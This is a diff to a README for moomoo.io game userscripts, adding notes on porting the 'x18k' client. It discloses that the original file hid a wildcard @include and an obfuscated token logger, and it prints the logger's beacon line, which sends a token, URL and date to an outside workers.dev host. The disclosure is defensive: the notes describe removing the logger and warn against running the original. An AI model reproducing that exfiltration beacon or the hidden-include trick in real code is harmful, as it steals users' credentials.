@@ -1,6 +1,6 @@
 # moomoo.io userscripts, updated for the current client
 
-Seven scripts. Five were current-generation clients that needed the new
+Eight scripts. Six were current-generation clients that needed the new
 transport layer. Two (the LemonMod pair) are a full protocol generation behind
 and additionally needed their packet vocabulary mapped forward.
 
@@ -14,6 +14,9 @@ and additionally needed their packet vocabulary mapped forward.
   with several bugs of its own on top.
 - **`Aurora.user.js`** (`Aurora Client v5.5`) — same family again, plus an
   ALTCHA proof-of-work solver and a private-server redirect.
+- **`X18K.user.js`** (`x18k`) — another client replacement that hijacks
+  `window.WebSocket`. Also shipped with a wildcard `@include` and a hidden
+  token logger; both removed. **Do not run the original.**
 - **`LemonMod.user.js`** / **`LemonModVisuals.user.js`** (v3.0) — 2019-era
   protocol; transport fixed, packet vocabulary mapped forward, and the main
   script deobfuscated. `LemonMod.obfuscated.user.js` is the same build before
@@ -585,6 +588,80 @@ So it fixes the protocol for you. It is not a promise that a given mod works.
 
 ---
 
+# X18K.user.js (`x18k`)
+
+A full client replacement, like Revelation and the Laffer remake: it bundles a
+whole copy of the game and runs it in place of the page's own. Unlike those, it
+does not discover a server itself — it hijacks `window.WebSocket`, lets the
+page do the server pick and the Turnstile challenge, and takes over the address
+the page was about to connect to.
+
+## Before the protocol: two things that shipped in the file
+
+**A wildcard `@include`.** Glued onto the end of the `@grant` line, past a
+couple hundred spaces so it does not show up unless you scroll, was:
+
+```
+// @include /moomoo.io|.*/
+```
+
+A regex include whose second alternative is `.*` — the script ran on **every
+site you visit**, not on moomoo.io.
+
+**A token logger.** Right under it, a 40 KB obfuscated block. It sets
+`window.tokenLoggerRan`, then checks whether the page URL contains
+`youtube.com/watch`; on moomoo.io it exits immediately, which is why nobody
+notices. Elsewhere it harvests a token and beacons it out as a Discord webhook
+payload:
+
+```
+new Image().src = "https://moomooio.iloveloggers.workers.dev/?data=" + base64(json)
+```
+
+with a `fetch` POST to `https://moomoo.iloveloggers.workers.dev/` as fallback
+when the image beacon does not fire. The JSON carries `{ Date, Token, URL }`
+under a "Logged info" embed. Nothing in the mod referenced any of it.
+
+I confirmed the behaviour by running the block in a sandboxed VM with a
+recording `window` — the beacon URL above is the actual output, not a reading
+of the source. Both the `@include` and the block are gone. (A second,
+already-commented-out copy of the same block sat below it; removed too.)
+
+## Why it did not run
+
+| Cause | Effect |
+| --- | --- |
+| `@require https://rawgit.com/…/msgpack.min.js` | rawgit.com has been dead since 2019. A failed `@require` stops the whole userscript from loading — nothing else in the file ever got a chance. The bundled msgpack-lite is what the code actually uses; the `@require` was never needed. |
+| No `@run-at` | Defaults to `document-idle`. By then the page has already captured `window.WebSocket` and pinned it with `writable: false, configurable: false`, so `window.WebSocket = class {…}` throws `TypeError` in strict mode and takes `app.js` down with it. Now `document-start`. |
+| Plain msgpack transport | Same break as every other mod here — see [Why it broke](#why-it-broke). |
+| `promoImgHolder.remove()` | The element no longer exists on the page, so this threw at module scope and killed the client before it drew a frame. |
+
+## What changed
+
+| Area | Fix |
+| --- | --- |
+| `X18P` module (new, top of file) | Seeded PRNG, opcode-table builder, SHA-256, HMAC-SHA256, hex key parsing, native `WebSocket.prototype.send` captured before anything is replaced. |
+| Socket stub | `window.WebSocket` is replaced at `document-start` via `defineProperty`, so the page's freeze pins *our* constructor. It carries a `prototype.send` and the `readyState` constants, because the page captures both at load. If the client is not up yet the address is queued rather than dropped. |
+| DOM timing | The client grabs `#gameCanvas`, `#mainMenu` and ~50 other elements at module scope, which cannot happen at `document-start`. Everything below the stub now waits for `DOMContentLoaded`; the stub goes in immediately and holds the address. |
+| `io.connect` | Parses `io-init`, builds the tables and key, and fires the connect callback **there** rather than on `onopen`. Incoming numeric opcodes map back to handler names; an unmapped one is ignored instead of throwing. |
+| `io.send` | Frames as `tag ‖ msgpack([opcode, args, seq])`. Nothing goes out before the handshake — on this server an untagged frame ends the session. Unknown names are dropped. |
+| Page render loop | The page's own client keeps its `requestAnimationFrame` loop running against `#gameCanvas` even though its socket never opens, and would repaint over every frame this client draws. It re-arms through `window.requestAnimFrame`, which nothing here uses, so that name is now an accessor that swallows the page's assignment and hands back a no-op. |
+| `onerror` | Compared `readyState` against `WebSocket.OPEN` — which is the stub after the hijack, so `undefined`. Points at `OriginalWebSocket.OPEN`. |
+| Ping | Was started before the error check and re-armed on every disconnect, stacking intervals. Now starts once, on a successful handshake. |
+| Ad removal | `promoImg` / `promoImgHolder` removal is null-guarded. |
+
+Captcha needed no work: the page renders Turnstile itself and appends the token
+to the connect URL, and that URL is exactly what the stub intercepts.
+
+## Known limitations
+
+- The **Send bots / Close bots** buttons in the menu have no handlers in this
+  build — the feature was never wired up by its author. Untouched.
+- The page's userscript-detection banner still appears. It is cosmetic and does
+  not block play.
+
+---
+
 ## Verification
 
 The protocol port was checked against the code lifted straight out of the game
@@ -609,9 +686,16 @@ hijack itself: that the stand-in tolerates everything the game does to it, that
 the captured URL reaches the mod with its token intact, and that all 17 of its
 packet names resolve to real opcodes.
 
+x18k gets the same protocol comparison plus the takeover itself: that the stub
+queues an address arriving before the client is up and forwards one arriving
+after, that the page's `requestAnimFrame` assignment is swallowed, that the
+connect callback fires on `io-init` and not on open, that nothing is sent
+before the handshake, that all 17 packet names it uses resolve to opcodes, and
+that the removed logger leaves no trace in the code.
+
 The test harness pulls the code under test straight out of the shipped scripts
 and out of the game bundles, so the tests cannot drift from what ships. Run
-them with `npm test` — 216 checks.
+them with `npm test` — 251 checks.
 
 None of them has been verified against the live server; that needs a
 browser and a real Turnstile token.
